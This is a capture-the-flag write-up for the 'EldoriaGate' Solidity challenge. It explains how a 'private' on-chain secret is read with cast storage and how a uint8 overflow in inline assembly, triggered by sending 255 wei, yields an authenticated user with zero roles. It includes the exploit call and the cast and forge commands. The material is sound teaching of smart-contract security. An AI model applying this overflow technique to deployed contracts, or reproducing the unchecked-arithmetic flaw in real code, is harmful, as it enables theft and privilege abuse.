# 🚩 EldoriaGate – Medium

![image](../img/EldoriaGateBanner.png)

- **Category:** Blockchain
- **CTF Event:** Cyber Apocalypse CTF 2025
- **Difficulty:** Medium
- **Points:** 975 Pts

---

## Challenge Description

> At long last, you stand before the EldoriaGate, the legendary protal, the culmination of your perilous journey. Your escape from this digital realm hinges upon passing this final, insurmountable barrier. Your fate rests upon the passage through these mythic gates. These are no mere gates of stone and steel. They are a living enchantment, a sentinel woven from ancient magic, judging all who dare approach. The Gate sees you, divining your worth, assigning your place within Eldoria's unyielding order. But you seek not a place within their order, but freedom beyond it. Become the Usurper. Defy the Gate's ancient magic. Pass through, yet leave no trace, no mark of your passing, no echo of your presence. Become the unseen, the unwritten, the legend whispered but never confirmed. Outwit the Gate. Become a phantom, a myth. Your escape, your destiny, awaits.

---

## Challenge Files

- [`EldoriaGate.sol`](src/EldoriaGate.sol)
- [`EldoriaGateKernel.sol`](src/EldoriaGateKernel.sol)
- [`Setup.sol`](src/Setup.sol)

---

## Objective

### `Setup.sol`

```
pragma solidity ^0.8.28;

import { EldoriaGate } from "./EldoriaGate.sol";

contract Setup {
    EldoriaGate public TARGET;
    address public player;

    event DeployedTarget(address at);

    constructor(bytes4 _secret, address _player) {
        TARGET = new EldoriaGate(_secret);
        player = _player;
        emit DeployedTarget(address(TARGET));
    }

    function isSolved() public returns (bool) {
        return TARGET.checkUsurper(player);
    }
}
```

Based on the `Setup.sol` file, we need to become the usurper in order to get the flag.

---

## Code Analysis / Vulnerability

### `EldoriaGate.sol`

```
pragma solidity ^0.8.28;

/***
    Malakar 1b:22-28, Tales from Eldoria - Eldoria Gates
  
    "In ages past, where Eldoria's glory shone,
     Ancient gates stand, where shadows turn to dust.
     Only the proven, with deeds and might,
     May join Eldoria's hallowed, guiding light.
     Through strict trials, and offerings made,
     Eldoria's glory, is thus displayed."
  
                   ELDORIA GATES
             *_   _   _   _   _   _ *
     ^       | `_' `-' `_' `-' `_' `|       ^
     |       |                      |       |
     |  (*)  |     .___________     |  \^/  |
     | _<#>_ |    //           \    | _(#)_ |
    o+o \ / \0    ||   =====   ||   0/ \ / (=)
     0'\ ^ /\/    ||           ||   \/\ ^ /`0
       /_^_\ |    ||    ---    ||   | /_^_\
       || || |    ||           ||   | || ||
       d|_|b_T____||___________||___T_d|_|b
  
***/

import { EldoriaGateKernel } from "./EldoriaGateKernel.sol";

contract EldoriaGate {
    EldoriaGateKernel public kernel;

    event VillagerEntered(address villager, uint id, bool authenticated, string[] roles);
    event UsurperDetected(address villager, uint id, string alertMessage);
    
    struct Villager {
        uint id;
        bool authenticated;
        uint8 roles;
    }

    constructor(bytes4 _secret) {
        kernel = new EldoriaGateKernel(_secret);
    }

    function enter(bytes4 passphrase) external payable {
        bool isAuthenticated = kernel.authenticate(msg.sender, passphrase);
        require(isAuthenticated, "Authentication failed");

        uint8 contribution = uint8(msg.value);        
        (uint villagerId, uint8 assignedRolesBitMask) = kernel.evaluateIdentity(msg.sender, contribution);
        string[] memory roles = getVillagerRoles(msg.sender);
        
        emit VillagerEntered(msg.sender, villagerId, isAuthenticated, roles);
    }

    function getVillagerRoles(address _villager) public view returns (string[] memory) {
        string[8] memory roleNames = [
            "SERF", 
            "PEASANT", 
            "ARTISAN", 
            "MERCHANT", 
            "KNIGHT", 
            "BARON", 
            "EARL", 
            "DUKE"
        ];

        (, , uint8 rolesBitMask) = kernel.villagers(_villager);

        uint8 count = 0;
        for (uint8 i = 0; i < 8; i++) {
            if ((rolesBitMask & (1 << i)) != 0) {
                count++;
            }
        }

        string[] memory foundRoles = new string[](count);
        uint8 index = 0;
        for (uint8 i = 0; i < 8; i++) {
            uint8 roleBit = uint8(1) << i; 
            if (kernel.hasRole(_villager, roleBit)) {
                foundRoles[index] = roleNames[i];
                index++;
            }
        }

        return foundRoles;
    }

    function checkUsurper(address _villager) external returns (bool) {
        (uint id, bool authenticated , uint8 rolesBitMask) = kernel.villagers(_villager);
        bool isUsurper = authenticated && (rolesBitMask == 0);
        emit UsurperDetected(
            _villager,
            id,
            "Intrusion to benefit from Eldoria, without society responsibilities, without suspicions, via gate breach."
        );
        return isUsurper;
    }
}
```

Let's see what's the condition become the usurper! Looking into the `checkUsurper()`, we can find that the requirement to be determine as the usurper is `authenticated` is `true` and the `rolesBitMask` equal to `0`. Well, the next step is to find out how to fulfill the requirement to become the usurper. 

There are another two functions in this contract, one is `getVillagerRoles()` which is just reading and returning some value instead of writing or changing value in the variables in the `kernel` instances, thus we can ignore it. 

Let's proceed to another function, `enter()`, this function looks interesting as it is a payable function which lets msg.sender to call it with ether. Furthermore, we can't find any direct state changing of `kernel` but we did observe that it has call two function (`authenticate()` and `evaluateIdentity()`) from the `kernel` instance where most probably changing the state of `kernel` which is want we looking for.

### `EldoriaGateKernel.sol`

```
pragma solidity ^0.8.28;

contract EldoriaGateKernel {
    bytes4 private eldoriaSecret; // 0xdeadfade
    mapping(address => Villager) public villagers;
    address public frontend;

    uint8 public constant ROLE_SERF     = 1 << 0; // 1
    uint8 public constant ROLE_PEASANT  = 1 << 1; // 2
    uint8 public constant ROLE_ARTISAN  = 1 << 2; // 4
    uint8 public constant ROLE_MERCHANT = 1 << 3; // 8
    uint8 public constant ROLE_KNIGHT   = 1 << 4; // 16
    uint8 public constant ROLE_BARON    = 1 << 5; // 32
    uint8 public constant ROLE_EARL     = 1 << 6; // 64
    uint8 public constant ROLE_DUKE     = 1 << 7; // 128
    
    struct Villager {
        uint id;
        bool authenticated;
        uint8 roles;
    }

    constructor(bytes4 _secret) {
        eldoriaSecret = _secret;
        frontend = msg.sender;
    }

    modifier onlyFrontend() {
        assembly {
            if iszero(eq(caller(), sload(frontend.slot))) {
                revert(0, 0)
            }
        }
        _;
    }

    function authenticate(address _unknown, bytes4 _passphrase) external onlyFrontend returns (bool auth) {
        assembly {
            let secret := sload(eldoriaSecret.slot)            
            auth := eq(shr(224, _passphrase), secret)
            mstore(0x80, auth)
            
            mstore(0x00, _unknown)
            mstore(0x20, villagers.slot)
            let villagerSlot := keccak256(0x00, 0x40)
            
            let packed := sload(add(villagerSlot, 1))
            auth := mload(0x80)
            let newPacked := or(and(packed, not(0xff)), auth)
            sstore(add(villagerSlot, 1), newPacked)
        }
    }

    function evaluateIdentity(address _unknown, uint8 _contribution) external onlyFrontend returns (uint id, uint8 roles) {
        assembly {
            mstore(0x00, _unknown)
            mstore(0x20, villagers.slot)
            let villagerSlot := keccak256(0x00, 0x40)

            mstore(0x00, _unknown)
            id := keccak256(0x00, 0x20)
            sstore(villagerSlot, id)

            let storedPacked := sload(add(villagerSlot, 1))
            let storedAuth := and(storedPacked, 0xff)
            if iszero(storedAuth) { revert(0, 0) }

            let defaultRolesMask := ROLE_SERF
            roles := add(defaultRolesMask, _contribution)
            if lt(roles, defaultRolesMask) { revert(0, 0) }

            let packed := or(storedAuth, shl(8, roles))
            sstore(add(villagerSlot, 1), packed)
        }
    }

    function hasRole(address _villager, uint8 _role) external view returns (bool hasRoleFlag) {
        assembly {
            mstore(0x0, _villager)
            mstore(0x20, villagers.slot)
            let villagerSlot := keccak256(0x0, 0x40)
        
            let packed := sload(add(villagerSlot, 1))
            let roles := and(shr(8, packed), 0xff)
            hasRoleFlag := gt(and(roles, _role), 0)
        }
    }
}
```

Looking into this contract, there are three function and one modifier, two state changing function and one view function. We can ignore the view function as it doesn't change the state variable of the `kernel` instance. The modifier `onlyFrontend` are applied on the two state changing function which only limit the caller to `EldoriaGate` contract only as it is the one who deploy the `EldoriaGateKernel` contract. It means that we can't call these two state changing function directly, we can only invoke them through the functions in the `EldoriaGate` contract.

Looking into the first state changing function, `authenticate()`, we can find that it first comparing whether the input parameter, `_passphrase` are equal to `secret` which is `eldoriaSecret` as the value its stored is retrieved from the slot of `eldoriaSecret`, and the compare result will be stored in `auth`. After that, in order to find out the location of mapping's value stored in storage, the method is to hash the key with the slot of mapping using keccak256. In this case, it first store the key which is the input parameter `_unknown` in the location `0x00`, follow by storing the slot of `villagers` which is the slot of mapping in the location of `0x20`. The reason of storing in `0x00` and `0x20` is to keep it with a length of bytes32. The next step is hashing, `keccak256(0x00, 0x40)`, this performs a keccak256 hashing starting from the location of `0x00` until a position of `0x40` which is 64 bytes in order to includes all the value of `_unknown` and slot of villagers, and the result will be stored at `villagerSlot`. Afterwards, it use `sload()` function to load the next slot's value of `villagerSlot`. In order to understand the reason of loading the next slot's value instead of just the value in the slot of `villagerSlot`, we need to first understand how struct are being stored in maapings. After finding the position of the key (Struct) are being stored, we need to look into the type of variable defined in the struct in order to understand how they are being stored. Taking this case as example, the `Villager` struct first defines a `uint` type (`id`), follow by a `bool` type (`authenticated`), and then follow by a `uint8` type (`roles`). When storing a `uint`, a length of 32 bytes will be needed which fill up a entire slot in storage. When storing a `bool` and `uint8` type, it only take up to 1 byte. Thus, the value of `villagerSlot` is the `uint` type, which is the `id` defined in the `Villager` struct. The next slot would store the value of `authenticated` and `roles` as they only take up to 2 bytes in total and the left will be padded with `0` for the remaining 30 bytes. This is the reason that why they save it as `packed` also as it packs the value of `authenticated` and `roles`. The next step, they use `and(packed, not(0xff))` to clear the lowest bytes of `packed` and use `or(and(packed, not(0xff)), auth)` to set the lowest bytes to `auth`, which means that replacing the lowest byte of `packed` with `auth`, while keeping the rest of the bytes. In summary, as long as the input parameters are equal to `eldoriaSecret`, you will be authenticated which fulfill the first condition to be the usurper.

Well, let's find how the second condition are being fulfilled. Looking into the `evaluateIdentity()` function, it did the same thing as `authenticate()` which is finding the storage location of `Villager` with the `_unknown` key. Afterward, it stored `_unknown` in the memory with a location of `0x00` for hashing purpose onwards and store it in the `villagerSlot` as the `id` defined in the `Villager` struct. Afterwards, it takes the next slot's value of `villagerSlot` which is the packed value of `authenticated` and `roles` and stored it in `storedPacked`. It then used `and(storedPacked, 0xff)` to masks everything except the lowest byte and stored it in `storedAuth`. Afterwards, it `ROLE_SERF` in `defaultRolesMask` and the value of it is `1` as `ROLE_SERF  = 1 << 0`, it uses bitwise left shifts (1 << n):

```
ROLE_SERF = 1 << 0 = 00000001 (binary) = 1 (decimal)
ROLE_PEASANT = 1 << 1 = 00000010 (binary) = 2 (decimal)
ROLE_ARTISAN = 1 << 2 = 00000100 (binary) = 4 (decimal)
ROLE_MERCHANT = 1 << 3 = 00001000 (binary) = 8 (decimal)
ROLE_KNIGHT = 1 << 4 = 00010000 (binary) = 16 (decimal)
ROLE_BARON = 1 << 5 = 00100000 (binary) = 32 (decimal)
ROLE_EARL = 1 << 6 = 01000000 (binary) = 64 (decimal)
ROLE_DUKE = 1 << 7 = 10000000 (binary) = 128 (decimal)
```

Afterwards, we can find that the value of `roles` will be the sum of `defaultRolesMask` and the input parameters, `_contribution`. It then use `shl(8, roles)` to shift the bits to the left by 8 bits which is 1 byte, for example: `0x02` to `0x0200`, so the `roles` lands at byte 1 instead of byte 0. It also then use `or(storedAuth, shl(8, roles)` to combine the result of `authenticated` and then store it back to the next slot of `villagerSlot` for updating the value. From here, we've found how the value of roles are being calculated and updated. Well, let's find out how to let the value of roles become `0` to meet out goal, we can find that `roles` are defined with a type of `uint8` and the way of calculating `roles` is just simply add on the `defaultRolesMask` and `_contribution`. Thus, in order to make the value of `roles` to be `0`, we can just simply make it overflow as in Yul, overflow and underflow are not being checked as default.

```md
🔑 Key Observations

- Msg.sender will be authenticated as long as the passphrase given are same as the `eldoriaSecret` in the `EldoriaGateKernel` contract.
- The calculation of `roles` (defined as a type of `uint8`) is the sum of `defaultRolesMask` and `_contribution` -> possible exploit if we let overflow occurs.
```

---

## Exploitation

According to the above analysis, there are two condition that we need to achieve in order to be the usurper. The first is being authenticated and the second is have zero roles.

```
function run() public returns (bool) {
    eldoriaGate.enter{value: 255}(0xdeadfade);
    return setup.isSolved();
}
```

To being authenticated, we need to called the `enter()` function and passing the correct passphrase in order to be authenticated. For the way of getting the passphrase, we can simply use this commend for checking the value of storage in the `EldoriaGateKernel` contract:

```
cast storage $EldoriaGateKernel 0 --rpc-url $RPC_URL
```

As we know that the way of validating passphrase is comparing it with the value of `eldoriaSecret` in the `EldoriaGateKernel` contract. Thus, we could just use this command to get the actual value of `eldoriaSecret` and it will return us with `0xdeadfade`.

To let the roles to be zero, we need to let `_contribution` to be `255` to occur overflow and cause the value of `roles` to be `0`.

```
roles = ROLE_SERF + _contribution = 1 + 255 = 256 (mod 256) = 0
```

Tracing back to the `enter()` function, `_contribution` is actually the msg.value, so we just need to call the `enter()` function with the correct passphrase and sending it with `255` wei.

See the full exploitation script [here](script/Exploit.s.sol).

### Command to Deploy the Script

```
forge script script/Exploit.s.sol --broadcast --rpc-url $RPC_URL --private-key $PK
```

Please kindlly save the variables in the `.env` file. However, please don't save your private key in plaint text like this in production!

### Command to Directly Interact with the `EldoriaGate` Contract without Script

```
cast send $ELDORIA_GATE "enter(bytes4)" 0xdeadfade --value 255 --rpc-url $RPC_URL --private-key $PK
```

---